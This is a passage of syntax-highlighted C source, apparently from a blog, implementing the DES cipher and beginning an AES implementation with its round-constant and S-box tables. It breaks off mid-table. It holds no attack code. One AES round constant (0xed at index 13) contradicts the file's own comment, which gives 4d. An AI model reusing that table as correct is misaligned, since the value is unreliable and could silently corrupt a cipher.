class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encryption</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * plaintext,<span class="type">unsigned</span> <span class="type">char</span> * ciphertext)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> array_plaintext[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> f_result[<span class="number">32</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> left_array[<span class="number">32</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> right_array[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">byte2Bit</span>(plaintext,array_plaintext,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">ip_replace</span>(array_plaintext,array_plaintext);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(left_array,array_plaintext,<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(right_array,array_plaintext+<span class="number">32</span>,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">15</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">f_func</span>(right_array,f_result,&amp;subkey[i][<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">byteXOR</span>(f_result,left_array,<span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(left_array,right_array,<span class="number">32</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(right_array,f_result,<span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">f_func</span>(right_array,f_result,&amp;subkey[i][<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">byteXOR</span>(left_array,f_result,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(array_plaintext,left_array,<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(array_plaintext+<span class="number">32</span>,right_array,<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fp_replace</span>(array_plaintext,array_plaintext);</span><br><span class="line">    <span class="built_in">bit2Byte</span>(array_plaintext,ciphertext,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">byte2Bit</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> *out,<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">8</span>;++j)&#123;</span><br><span class="line">            out[i*<span class="number">8</span>+j] = (in[i]&gt;&gt;(<span class="number">7</span>-j))&amp;<span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bit2Byte</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> *out,<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">        temp = in[i*<span class="number">8</span>]&amp;<span class="number">0x1</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;<span class="number">8</span>;++j)&#123;</span><br><span class="line">            temp = temp&lt;&lt;<span class="number">1</span>;</span><br><span class="line">            temp = temp+(in[i*<span class="number">8</span>+j]&amp;<span class="number">0x1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        out[i]=temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//change the input 64 bit data to 64 bytes array, use ip table to replace 64 bytes array</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ip_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> *out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp,in,<span class="number">64</span>);</span><br><span class="line">    <span class="comment">//use ip table to replace 64 bytes(bit) array</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;++i)&#123;</span><br><span class="line">        out[i] = temp[IP_Table[i]<span class="number">-1</span>];</span><br><span class="line">        <span class="comment">//printf(&quot;%x &quot;,out[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fp_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span>* out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(temp,in,<span class="number">64</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;++i)</span><br><span class="line">        out[i] = temp[IPR_Table[i]<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">e_expand</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in, <span class="type">unsigned</span> <span class="type">char</span> *out)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">48</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(temp,in,<span class="number">48</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">48</span>;++i)</span><br><span class="line">        out[i] = temp[E_Table[i]<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">s_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> *out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> raw,col;</span><br><span class="line">    <span class="type">char</span> temp;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;<span class="number">8</span>;++i)&#123;</span><br><span class="line">        raw = ((in[i*<span class="number">6</span>]&lt;&lt;<span class="number">1</span>)|(in[i*<span class="number">6</span>+<span class="number">5</span>]))&amp;<span class="number">0x3</span>;</span><br><span class="line">        col = ((in[i*<span class="number">6</span>+<span class="number">1</span>]&lt;&lt;<span class="number">3</span>)|(in[i*<span class="number">6</span>+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>)|(in[i*<span class="number">6</span>+<span class="number">3</span>]&lt;&lt;<span class="number">1</span>)|(in[i*<span class="number">6</span>+<span class="number">4</span>]))&amp;<span class="number">0xF</span>;</span><br><span class="line">        temp = S_Box[i][raw][col]&amp;<span class="number">0xF</span>;</span><br><span class="line">        out[j] = (temp&gt;&gt;<span class="number">3</span>)&amp;<span class="number">0x1</span>;</span><br><span class="line">        out[j+<span class="number">1</span>] = (temp&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x1</span>;</span><br><span class="line">        out[j+<span class="number">2</span>] = (temp&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>;</span><br><span class="line">        out[j+<span class="number">3</span>] = (temp)&amp;<span class="number">0x1</span>;</span><br><span class="line">        j+=<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">p_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> * out)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(temp,in,<span class="number">32</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;++i)&#123;</span><br><span class="line">        out[i] = temp[P_Table[i]<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">byteXOR</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *a,<span class="type">unsigned</span> <span class="type">char</span> *b,<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)&#123;</span><br><span class="line">        a[i] = (a[i]+b[i])&amp;<span class="number">0x1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> * out,<span class="type">unsigned</span> <span class="type">char</span> * ki)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> expand_result[<span class="number">48</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> replace_result[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">e_expand</span>(in,expand_result);</span><br><span class="line">    <span class="built_in">byteXOR</span>(expand_result,ki,<span class="number">48</span>);</span><br><span class="line">    <span class="built_in">s_replace</span>(expand_result,replace_result);</span><br><span class="line">    <span class="built_in">p_replace</span>(replace_result,replace_result);</span><br><span class="line">    <span class="built_in">memcpy</span>(out,replace_result,<span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pc1_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * in,<span class="type">unsigned</span> <span class="type">char</span> * out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">56</span>;++i)</span><br><span class="line">        out[i]=in[PC1_Table[i]<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pc2_replace</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> *out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">48</span>;++i)</span><br><span class="line">        out[i] = in[PC2_Table[i]<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shift_left</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *in,<span class="type">unsigned</span> <span class="type">char</span> *out,<span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">28</span>];</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(temp,in,<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=len,j=<span class="number">0</span>;i&lt;<span class="number">28</span>;++i)</span><br><span class="line">        out[j++]=temp[i];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;++i)</span><br><span class="line">        out[j++]=temp[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//use user&#x27;s input key to generate 16 subkey</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_subkey</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *key)</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key_temp[<span class="number">64</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> pc1_result[<span class="number">56</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> pc2_result[<span class="number">48</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">byte2Bit</span>(key,key_temp,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">pc1_replace</span>(key_temp,pc1_result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">shift_left</span>(pc1_result,pc1_result,LOOP_Table[i]);</span><br><span class="line">        <span class="built_in">shift_left</span>(pc1_result+<span class="number">28</span>,pc1_result+<span class="number">28</span>,LOOP_Table[i]);</span><br><span class="line">        <span class="built_in">pc2_replace</span>(pc1_result,pc2_result);</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;subkey[i][<span class="number">0</span>],pc2_result,<span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="aes"><a class="markdownIt-Anchor" href="#aes">#</a> AES</h4>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  AES_CYPHER_128,</span><br><span class="line">  AES_CYPHER_192,</span><br><span class="line">  AES_CYPHER_256,</span><br><span class="line">&#125; AES_CYPHER_T;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Encryption Rounds</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> g_aes_key_bits[] = &#123;</span><br><span class="line">  <span class="comment">/* AES_CYPHER_128 */</span> <span class="number">128</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_192 */</span> <span class="number">192</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_256 */</span> <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> g_aes_rounds[] = &#123;</span><br><span class="line">  <span class="comment">/* AES_CYPHER_128 */</span>  <span class="number">10</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_192 */</span>  <span class="number">12</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_256 */</span>  <span class="number">14</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> g_aes_nk[] = &#123;</span><br><span class="line">  <span class="comment">/* AES_CYPHER_128 */</span>  <span class="number">4</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_192 */</span>  <span class="number">6</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_256 */</span>  <span class="number">8</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> g_aes_nb[] = &#123;</span><br><span class="line">  <span class="comment">/* AES_CYPHER_128 */</span>  <span class="number">4</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_192 */</span>  <span class="number">4</span>,</span><br><span class="line">  <span class="comment">/* AES_CYPHER_256 */</span>  <span class="number">4</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* aes Rcon:</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* WARNING: Rcon is designed starting from 1 to 15, not 0 to 14.</span></span><br><span class="line"><span class="comment">*          FIPS-197 Page 9: &quot;note that i starts at 1, not 0&quot;</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* i    |   0     1     2     3     4     5     6     7     8     9    10    11    12    13    14</span></span><br><span class="line"><span class="comment">* -----+------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">*      | [01]  [02]  [04]  [08]  [10]  [20]  [40]  [80]  [1b]  [36]  [6c]  [d8]  [ab]  [4d]  [9a]</span></span><br><span class="line"><span class="comment">* RCON | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]</span></span><br><span class="line"><span class="comment">*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]</span></span><br><span class="line"><span class="comment">*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> g_aes_rcon[] = &#123;</span><br><span class="line">  <span class="number">0x01000000</span>, <span class="number">0x02000000</span>, <span class="number">0x04000000</span>, <span class="number">0x08000000</span>, <span class="number">0x10000000</span>, <span class="number">0x20000000</span>, <span class="number">0x40000000</span>, <span class="number">0x80000000</span>,</span><br><span class="line">  <span class="number">0x1b000000</span>, <span class="number">0x36000000</span>, <span class="number">0x6c000000</span>, <span class="number">0xd8000000</span>, <span class="number">0xab000000</span>, <span class="number">0xed000000</span>, <span class="number">0x9a000000</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/****************************************************************************************************************/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* aes sbox and invert-sbox</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint8_t</span> g_aes_sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="comment">/* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */</span></span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line">  <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line">  <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line">  <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">  <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line">  <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line">  <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line">  <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line">  <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint8_t</span> g_inv_sbox[<span class="number">256</span>] = &#123;</span><br><span class="line">  <span class="comment">/* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */</span></span><br><span class="line">  <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6a</span>, <span class="number">0xd5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xa5</span>, <span class="number">0x38</span>, <span class="number">0xbf</span>, <span class="number">0x40</span>, <span class="number">0xa3</span>, <span class="number">0x9e</span>, <span class="number">0x81</span>, <span class="number">0xf3</span>, <span class="number">0xd7</span>, <span class="number">0xfb</span>,</span><br><span class="line">  <span class="number">0x7c</span>, <span class="number">0xe3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9b</span>, <span class="number">0x2f</span>, <span class="number">0xff</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8e</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xc4</span>, <span class="number">0xde</span>, <span class="number">0xe9</span>, <span class="number">0xcb</span>,</span><br><span class="line">  <span class="number">0x54</span>, <span class="number">0x7b</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xa6</span>, <span class="number">0xc2</span>, <span class="number">0x23</span>, <span class="number">0x3d</span>, <span class="number">0xee</span>, <span class="number">0x4c</span>, <span class="number">0x95</span>, <span class="number">0x0b</span>, <span class="number">0x42</span>, <span class="number">0xfa</span>, <span class="number">0xc3</span>, <span class="number">0x4e</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x2e</span>, <span class="number">0xa1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xd9</span>, <span class="number">0x24</span>, <span class="number">0xb2</span>, <span class="number">0x76</span>, <span class="number">0x5b</span>, <span class="number">0xa2</span>, <span class="number">0x49</span>, <span class="number">0x6d</span>, <span class="number">0x8b</span>, <span class="number">0xd1</span>, <span class="number">0x25</span>,</span><br><span class="line">  <span class="number">0x72</span>, <span class="number">0xf8</span>, <span class="number">0xf6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0x5c</span>, <span class="number">0xcc</span>, <span class="number">0x5d</span>, <span class="number">0x65</span>, <span class="number">0xb6</span>, <span class="number">0x92</span>,</span><br><span class="line">  <span class="number">0x6c</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xfd</span>, <span class="number">0xed</span>, <span class="number">0xb9</span>, <span class="number">0xda</span>, <span class="number">0x5e</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xa7</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0x84</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x00</span>, <span class="number">0x8c</span>, <span class="number">0xbc</span>, <span class="number">0xd3</span>, <span class="number">0x0a</span>, <span class="number">0xf7</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0xb3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">  <span class="number">0xd0</span>, <span class="number">0x2c</span>, <span class="number">0x1e</span>, <span class="number">0x8f</span>, <span class="number">0xca</span>, <span class="number">0x3f</span>, <span class="number">0x0f</span>, <span class="number">0x02</span>, <span class="number">0xc1</span>, <span class="number">0xaf</span>, <span class="number">0xbd</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8a</span>, <span 